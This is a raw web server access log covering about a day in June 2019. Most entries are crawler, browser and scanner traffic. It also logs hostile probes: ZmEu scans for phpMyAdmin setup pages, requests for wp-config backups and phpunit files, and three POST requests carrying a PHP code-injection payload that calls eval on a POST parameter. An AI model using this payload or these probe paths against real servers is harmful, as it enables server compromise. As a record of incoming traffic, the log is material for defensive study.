219.137.206.112 - - [17/Jun/2019:13:27:12 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
139.162.119.197 - - [17/Jun/2019:13:31:21 +0800] "GET / HTTP/1.1" 499 0 "-" "HTTP Banner Detection (https://security.ipip.net)"
219.137.206.112 - - [17/Jun/2019:14:11:41 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
219.137.206.112 - - [17/Jun/2019:14:16:21 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
1.202.62.26 - - [17/Jun/2019:14:22:06 +0800] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:12 +0800] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:18 +0800] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:24 +0800] "GET /pma/scripts/setup.php HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:31 +0800] "GET /myadmin/scripts/setup.php HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:37 +0800] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 499 0 "-" "ZmEu"
1.202.62.26 - - [17/Jun/2019:14:22:37 +0800] "GET  HTTP/1.1" 400 179 "-" "-"
104.199.169.36 - - [17/Jun/2019:14:27:05 +0800] "GET ///vendor/phpunit/phpunit/phpunit.xsd HTTP/1.1" 504 189 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
163.177.13.2 - - [17/Jun/2019:14:33:14 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
163.177.13.2 - - [17/Jun/2019:14:54:35 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
163.177.13.2 - - [17/Jun/2019:14:56:54 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
207.180.203.210 - - [17/Jun/2019:15:07:12 +0800] "GET /robots.txt HTTP/1.1" 504 189 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
207.180.203.210 - - [17/Jun/2019:15:07:58 +0800] "GET /robots.txt HTTP/1.0" 499 0 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
157.55.39.17 - - [17/Jun/2019:15:11:30 +0800] "GET /robots.txt HTTP/1.1" 499 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.138 - - [17/Jun/2019:15:11:55 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
219.137.206.112 - - [17/Jun/2019:15:17:00 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
5.234.230.127 - - [17/Jun/2019:15:27:00 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
60.191.52.254 - - [17/Jun/2019:15:35:11 +0800] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
183.136.190.62 - - [17/Jun/2019:15:44:22 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
219.137.206.112 - - [17/Jun/2019:15:54:04 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
183.136.190.62 - - [17/Jun/2019:15:56:56 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
183.136.190.62 - - [17/Jun/2019:15:58:52 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
183.136.190.62 - - [17/Jun/2019:16:06:42 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
219.137.206.112 - - [17/Jun/2019:16:21:32 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
163.177.13.2 - - [17/Jun/2019:16:22:28 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
183.3.129.111 - - [17/Jun/2019:16:24:59 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
93.183.163.138 - - [17/Jun/2019:16:41:22 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
92.101.167.48 - - [17/Jun/2019:17:02:57 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
92.101.167.48 - - [17/Jun/2019:17:03:02 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
92.101.167.48 - - [17/Jun/2019:17:03:08 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
219.137.206.112 - - [17/Jun/2019:17:36:12 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
197.210.135.139 - - [17/Jun/2019:17:40:00 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.75.36 - - [17/Jun/2019:18:06:05 +0800] "GET /robots.txt HTTP/1.1" 504 189 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
163.177.13.2 - - [17/Jun/2019:18:13:09 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
163.177.13.2 - - [17/Jun/2019:18:16:35 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
80.82.70.187 - - [17/Jun/2019:18:32:20 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 499 0 "-" "Mozilla"
163.177.13.2 - - [17/Jun/2019:18:42:55 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
189.78.254.35 - - [17/Jun/2019:19:01:22 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
103.91.92.235 - - [17/Jun/2019:19:13:30 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
37.232.13.6 - - [17/Jun/2019:19:20:29 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
39.96.44.30 - - [17/Jun/2019:20:20:03 +0800] "GET /robots.txt HTTP/1.1" 499 0 "-" "Mozilla/5.0 (compatible; MagiBot/1.0.0; Matarael; +https://magi.com/bots)"
39.96.44.30 - - [17/Jun/2019:20:20:08 +0800] "GET / HTTP/1.1" 499 0 "https://blog.51cto.com/wangbojing/2105990" "Mozilla/5.0 (compatible; MagiBot/1.0.0; Matarael; +https://magi.com/bots)"
47.103.61.85 - - [17/Jun/2019:21:19:25 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.61.85 - - [17/Jun/2019:21:19:35 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.61.85 - - [17/Jun/2019:21:19:45 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
223.72.64.154 - - [17/Jun/2019:21:25:04 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
219.137.206.112 - - [17/Jun/2019:21:30:54 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
219.137.206.112 - - [17/Jun/2019:21:40:02 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
42.236.10.117 - - [17/Jun/2019:21:43:44 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; zh-CN; EML-AL00 Build/HUAWEIEML-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.9.4.974 UWS/2.13.1.48 Mobile Safari/537.36 AliApp(DingTalk/4.5.11) com.alibaba.android.rimet/10487439 Channel/227200 language/zh-CN"
219.137.206.112 - - [17/Jun/2019:21:56:10 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
183.157.114.55 - - [17/Jun/2019:22:21:17 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3676.400 QQBrowser/10.4.3469.400"
35.166.81.25 - - [17/Jun/2019:22:30:50 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
113.47.159.55 - - [17/Jun/2019:22:43:36 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3676.400 QQBrowser/10.4.3505.400"
163.177.13.2 - - [17/Jun/2019:22:45:27 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
219.137.206.112 - - [17/Jun/2019:22:46:32 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
219.137.206.112 - - [17/Jun/2019:23:00:55 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
159.89.43.233 - - [17/Jun/2019:23:05:57 +0800] "GET / HTTP/1.1" 499 0 "http://ntytcp.com" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
64.233.172.31 - - [17/Jun/2019:23:09:40 +0800] "GET / HTTP/1.1" 504 591 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
163.177.13.2 - - [17/Jun/2019:23:14:52 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
219.137.206.112 - - [18/Jun/2019:00:26:25 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
194.50.254.224 - - [18/Jun/2019:01:06:51 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
191.37.79.6 - - [18/Jun/2019:01:14:29 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
24.99.189.116 - - [18/Jun/2019:02:04:36 +0800] "GET / HTTP/1.1" 499 0 "-" "-"
157.55.39.29 - - [18/Jun/2019:02:49:16 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.254.59.113 - - [18/Jun/2019:02:52:14 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
51.254.59.113 - - [18/Jun/2019:02:52:15 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03X\xC8\xD0M\x89\xEA\xB0f\xC4z\xBBM\xDE\x1D\xD28\xC7A\xED\xC1\xA4\xAE\xFB\xFA\xEC\xE2\xD2\x94\x04\x19\x17f\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 179 "-" "-"
51.254.59.113 - - [18/Jun/2019:02:52:15 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03M\x22\xF4\xDE\x02\xF7oM 0A\xBD\x80\x01\x16\xD5\x9F\x8BP\x80D\xD0I8\x1E\xF4\x10\xEF\xF5EkE\x00\x00\xDA\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" 400 179 "-" "-"
179.228.18.221 - - [18/Jun/2019:03:09:55 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
101.132.97.53 - - [18/Jun/2019:03:25:30 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
101.132.126.80 - - [18/Jun/2019:03:27:08 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
103.218.1.72 - - [18/Jun/2019:03:30:03 +0800] "GET /pmd/ HTTP/1.1" 499 0 "http://47.106.79.26/pmd/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
103.218.1.72 - - [18/Jun/2019:03:30:18 +0800] "GET /pmd/ HTTP/1.1" 499 0 "http://47.106.79.26/pmd/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
163.177.13.2 - - [18/Jun/2019:03:36:10 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
183.136.190.62 - - [18/Jun/2019:03:48:00 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
183.136.190.62 - - [18/Jun/2019:03:56:53 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
183.136.190.62 - - [18/Jun/2019:04:04:43 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
80.82.70.187 - - [18/Jun/2019:04:31:11 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 499 0 "-" "Mozilla"
110.249.212.46 - - [18/Jun/2019:04:41:07 +0800] "GET http://110.249.212.46/testget?q=23333&port=80 HTTP/1.1" 400 179 "-" "-"
183.136.190.62 - - [18/Jun/2019:04:42:59 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
71.6.143.90 - - [18/Jun/2019:04:43:51 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 zgrab/0.x"
171.113.174.1 - - [18/Jun/2019:04:44:53 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
39.98.209.222 - - [18/Jun/2019:04:49:02 +0800] "GET /wp-config.php.backup HTTP/1.1" 499 0 "-" "-"
42.236.55.21 - - [18/Jun/2019:05:40:23 +0800] "GET / HTTP/1.1" 504 591 "http://47.106.79.26" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
163.177.13.2 - - [18/Jun/2019:05:48:45 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
42.236.12.170 - - [18/Jun/2019:05:54:51 +0800] "GET / HTTP/1.1" 504 591 "http://www.ntytcp.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
163.177.13.2 - - [18/Jun/2019:06:00:19 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
163.177.13.2 - - [18/Jun/2019:06:02:14 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
162.213.39.212 - - [18/Jun/2019:06:05:41 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
163.177.13.2 - - [18/Jun/2019:06:08:48 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
163.177.13.2 - - [18/Jun/2019:06:11:53 +0800] "HEAD / HTTP/1.1" 499 0 "-" "-"
113.92.128.121 - - [18/Jun/2019:07:39:06 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
47.92.146.247 - - [18/Jun/2019:08:17:10 +0800] "GET /wp-config.php.backup HTTP/1.1" 499 0 "-" "-"
161.132.177.210 - - [18/Jun/2019:09:43:02 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.42.16.5 - - [18/Jun/2019:09:52:37 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
54.202.217.123 - - [18/Jun/2019:10:01:30 +0800] "GET / HTTP/1.1" 499 0 "-" "Go-http-client/1.1"
180.163.220.125 - - [18/Jun/2019:10:32:50 +0800] "GET / HTTP/1.1" 504 189 "http://47.106.79.26" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)"
185.155.15.2 - - [18/Jun/2019:10:35:05 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
41.60.236.90 - - [18/Jun/2019:10:42:01 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
101.132.103.15 - - [18/Jun/2019:11:05:15 +0800] "POST /type.php?template=tag_()%7B%7D;@unlink(FILE);eval($_POST[qazw]);%7B//../rss HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.7.2333.33 Safari/537.36 AliyunTaiShiGanZhi WebshellScan https://www.aliyun.com/product/sas"
101.132.103.15 - - [18/Jun/2019:11:05:31 +0800] "POST /type.php?template=tag_()%7B%7D;@unlink(FILE);eval($_POST[qazw]);%7B//../rss HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.7.2333.33 Safari/537.36 AliyunTaiShiGanZhi WebshellScan https://www.aliyun.com/product/sas"
101.132.103.15 - - [18/Jun/2019:11:05:47 +0800] "POST /type.php?template=tag_()%7B%7D;@unlink(FILE);eval($_POST[qazw]);%7B//../rss HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.7.2333.33 Safari/537.36 AliyunTaiShiGanZhi WebshellScan https://www.aliyun.com/product/sas"
184.186.204.98 - - [18/Jun/2019:12:17:42 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.69.75 - - [18/Jun/2019:12:24:10 +0800] "GET /robots.txt HTTP/1.1" 504 189 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.75 - - [18/Jun/2019:12:25:10 +0800] "GET /index.php/2018/04/09/ HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
47.52.210.38 - - [18/Jun/2019:12:26:55 +0800] "GET / HTTP/1.0" 499 0 "-" "-"
66.249.69.77 - - [18/Jun/2019:12:58:10 +0800] "GET /robots.txt HTTP/1.1" 504 189 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
116.23.19.20 - - [18/Jun/2019:13:01:27 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
42.236.99.44 - - [18/Jun/2019:13:10:41 +0800] "GET / HTTP/1.1" 504 591 "http://47.106.79.26" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
116.16.23.50 - - [18/Jun/2019:13:10:42 +0800] "GET HTTP://47.106.79.26:80/ HTTP/1.1" 499 0 "http://47.106.79.26" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)"
198.108.66.192 - - [18/Jun/2019:13:17:32 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 zgrab/0.x"
110.249.212.46 - - [18/Jun/2019:13:42:35 +0800] "GET http://110.249.212.46/testget?q=23333&port=80 HTTP/1.1" 400 179 "-" "-"
110.77.172.220 - - [18/Jun/2019:13:43:41 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
110.249.212.46 - - [18/Jun/2019:13:45:09 +0800] "GET http://110.249.212.46/testget?q=23333&port=80 HTTP/1.1" 400 179 "-" "-"
80.82.70.187 - - [18/Jun/2019:14:29:28 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 499 0 "-" "Mozilla"
180.163.220.47 - - [18/Jun/2019:14:36:32 +0800] "GET / HTTP/1.1" 504 189 "http://47.106.79.26" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)"
119.18.147.59 - - [18/Jun/2019:15:26:00 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
47.103.61.116 - - [18/Jun/2019:15:35:34 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.101.24 - - [18/Jun/2019:15:35:34 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.61.116 - - [18/Jun/2019:15:35:44 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.101.24 - - [18/Jun/2019:15:35:44 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.61.116 - - [18/Jun/2019:15:35:54 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
47.103.101.24 - - [18/Jun/2019:15:35:54 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
183.136.190.62 - - [18/Jun/2019:15:44:35 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
103.220.28.49 - - [18/Jun/2019:15:50:12 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
116.23.19.20 - - [18/Jun/2019:15:51:11 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
183.136.190.62 - - [18/Jun/2019:15:53:25 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
